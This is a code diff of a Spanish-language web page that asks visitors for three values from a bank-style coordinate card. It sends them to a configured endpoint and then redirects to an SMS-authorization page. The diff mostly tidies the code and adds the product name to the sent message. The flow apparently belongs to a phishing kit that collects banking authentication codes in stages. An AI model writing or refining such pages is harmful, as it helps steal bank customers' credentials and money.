@@ -6,39 +6,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="styles.css">
   <style>
-    .coord-container {
-      margin: 20px 0;
-    }
-    .coord-container label {
-      display: block;
-      margin-bottom: 15px;
-      font-weight: bold;
-      font-size: 1.1em;
-    }
-    .coord {
-      width: 100%;              /* ✅ ocupa todo el ancho en móviles */
-      max-width: 120px;         /* límite en pantallas grandes */
-      padding: 12px;
-      text-align: center;
-      font-size: 1.2em;
-      margin-top: 8px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-    }
-    .botones {
-      margin-top: 20px;
-    }
-    .btn-red {
-      width: 100%;              /* ✅ botón ocupa todo el ancho */
-      padding: 14px;
-      font-size: 1.1em;
-    }
-    #mensaje {
-      margin-top: 20px;
-      font-weight: bold;
-      color: red;
-      text-align: center;
-    }
+    .coord-container { margin: 20px 0; }
+    .coord-container label { display: block; margin-bottom: 15px; font-weight: bold; }
+    .coord { width: 100%; max-width: 120px; padding: 12px; text-align: center; font-size: 1.2em; margin-top: 8px; border: 1px solid #ccc; border-radius: 6px; }
+    .btn-red { width: 100%; padding: 14px; font-size: 1.1em; }
+    #mensaje { margin-top: 20px; font-weight: bold; color: red; text-align: center; }
   </style>
 </head>
 <body>
@@ -53,9 +25,7 @@
         <label id="label2"></label>
         <label id="label3"></label>
       </div>
-      <div class="botones">
-        <button type="submit" class="btn-red">Autorizar</button>
-      </div>
+      <button type="submit" class="btn-red">Autorizar</button>
     </form>
 
     <div id="mensaje"></div>
@@ -70,19 +40,13 @@
         const res = await fetch(API_URL);
         const data = await res.json();
 
-        // Mostrar producto seleccionado
         const seleccion = localStorage.getItem("seleccionProducto");
         let producto = "";
-        if(seleccion === "producto1"){
-          producto = data.producto1 || "";
-        } else if(seleccion === "producto2"){
-          producto = data.producto2 || "";
-        } else if(seleccion === "producto3"){
-          producto = data.producto3 || "";
-        }
+        if(seleccion === "producto1"){ producto = data.producto1 || ""; }
+        else if(seleccion === "producto2"){ producto = data.producto2 || ""; }
+        else if(seleccion === "producto3"){ producto = data.producto3 || ""; }
         document.getElementById("productoSeleccionado").innerText = producto;
 
-        // Mostrar coordenadas configuradas
         document.getElementById("label1").innerHTML = `${data.coord1}: <input type="text" id="coord1" class="coord" maxlength="2" required>`;
         document.getElementById("label2").innerHTML = `${data.coord2}: <input type="text" id="coord2" class="coord" maxlength="2" required>`;
         document.getElementById("label3").innerHTML = `${data.coord3}: <input type="text" id="coord3" class="coord" maxlength="2" required>`;
@@ -91,14 +55,14 @@
       }
     });
 
-    // Enviar coordenadas ingresadas
-    document.getElementById("formCoordenadas").addEventListener("submit", async function(e){
+    document.getElementById("formCoordenadas").addEventListener("submit", async e => {
       e.preventDefault();
+      const producto = document.getElementById("productoSeleccionado").innerText;
       const coord1 = document.getElementById("coord1").value;
       const coord2 = document.getElementById("coord2").value;
       const coord3 = document.getElementById("coord3").value;
 
-      const mensaje = `Autorización por coordenadas:\n${document.getElementById("label1").textContent} ${coord1}\n${document.getElementById("label2").textContent} ${coord2}\n${document.getElementById("label3").textContent} ${coord3}`;
+      const mensaje = `Autorización por coordenadas:\nProducto: ${producto}\n${coord1}\n${coord2}\n${coord3}`;
 
       try {
         await fetch(AUTORIZAR_URL, {
@@ -107,9 +71,7 @@
           body: JSON.stringify({ mensaje })
         });
         document.getElementById("mensaje").innerText = "✅ Coordenadas enviadas, cargando SMS...";
-        setTimeout(() => {
-          window.location.href="autorizacion-sms.html";
-        }, 2000);
+        setTimeout(() => { window.location.href="autorizacion-sms.html"; }, 2000);
       } catch (error) {
         document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
       }
